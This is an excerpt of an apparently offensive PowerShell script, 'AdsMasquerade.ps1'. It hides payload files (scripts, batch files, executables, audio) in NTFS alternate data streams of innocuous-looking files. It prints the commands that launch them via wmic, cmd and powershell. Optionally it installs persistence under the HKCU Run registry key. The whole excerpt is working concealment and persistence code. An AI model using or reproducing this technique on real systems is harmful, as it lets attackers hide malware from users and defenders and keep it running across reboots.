...
.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.tpng" -registry "true"
...
.OUTPUTS
   ...
   [cmd] ExecuteADS  : wmic.exe process call create "C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png:payload.exe"
...
ElseIf($ADS -ieq "Create")
{
    ...
    If($ParseDataName -Match '.ps1$')
    {
        ...
        echo "[cmd] ExecuteADS  : powershell .\${InTextFile}:${ParseDataName}" >> $Env:TMP\gdfdod.log
        ...
        If($Registry -ieq "True")
        {
           ...
           New-ItemProperty -Path "$path1" -Name 'ADSpersistencePS' -Value "powershell .\${InTextFile}:${ParseDataName}" -PropertyType String -Force|Select-Object ADSpersistencePS,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 1
        }
    }
    ElseIf($ParseDataName -Match '.bat$')
    {
        ...
        echo "[ads] LegitFile   : $InTextFile" >> $Env:TMP\gdfdod.log
        echo "[ads] PayloadPath : $StreamData" >> $Env:TMP\gdfdod.log
        echo "[cmd] ExecuteADS  : cmd.exe - < ${InTextFile}:${ParseDataName}" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"|Format-List|Out-String -Stream|ForEach-Object {
           $stringformat = If($_ -iMatch '(LegitFile|PayloadPath)')
           {
              @{ 'ForegroundColor' = 'DarkGray' }
        ...
        If($Registry -ieq "True")
        {
           #Add to registry RUN
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceBAT' -Value "cmd /R `"cmd.exe - < ${InTextFile}:${ParseDataName}`"" -PropertyType String -Force|Select-Object ADSpersistenceBAT,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 1
        }
    }
    ElseIf($ParseDataName -Match '.txt$')
    {
        ...
        echo "[ads] LegitFile   : $InTextFile" >> $Env:TMP\gdfdod.log
        echo "[ads] payloadPath : $StreamData" >> $Env:TMP\gdfdod.log
        echo "[cmd] ExecuteADS  : cmd /c notepad.exe ${InTextFile}:${ParseDataName}" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"|Format-List|Out-String -Stream|ForEach-Object {
           $stringformat = If($_ -iMatch '(LegitFile|PayloadPath)')
           {
              @{ 'ForegroundColor' = 'DarkGray' }
        ...
        If($Registry -ieq "True")
        {
           #Add to registry RUN
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceTXT' -Value "cmd /R notepad.exe ${InTextFile}:${ParseDataName}" -PropertyType String -Force|Select-Object ADSpersistenceTXT,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 1
        }
    }
    ElseIf($ParseDataName -Match '.exe$')
    {
        ...
        echo "[ads] LegitFile   : $InTextFile" >> $Env:TMP\gdfdod.log
        echo "[ads] PayloadPath : $StreamData" >> $Env:TMP\gdfdod.log
        echo "[cmd] ExecuteADS  : wmic.exe process call create `"${InTextFile}:${ParseDataName}`"" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"|Format-List|Out-String -Stream|ForEach-Object {
           $stringformat = If($_ -iMatch '(LegitFile|PayloadPath)')
           {
              @{ 'ForegroundColor' = 'DarkGray' }
        ...
        If($Registry -ieq "True")
        {
           #Add to registry RUN
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceEXE' -Value "cmd /R wmic.exe process call create `"${InTextFile}:${ParseDataName}`"" -PropertyType String -Force|Select-Object ADSpersistenceEXE,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 1
        }
    }
    ElseIf($ParseDataName -Match '.mp3$')
    {
        ...
        echo "[ads] LegitFile   : $InTextFile" >> $Env:TMP\gdfdod.log
        echo "[ads] PayloadPath : $StreamData" >> $Env:TMP\gdfdod.log
        echo "[cmd] ExecuteADS  : wmplayer.exe `"${InTextFile}:${ParseDataName}`"" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"|Format-List|Out-String -Stream|ForEach-Object {
           $stringformat = If($_ -iMatch '(LegitFile|PayloadPath)')
           {
              @{ 'ForegroundColor' = 'DarkGray' }
        ...
        If($Registry -ieq "True")
        {
           #Add to registry RUN
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceMP3' -Value "cmd /R wmplayer.exe `"${InTextFile}:${ParseDataName}`"" -PropertyType String -Force|Select-Object ADSpersistenceMP3,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 1
        }
    }
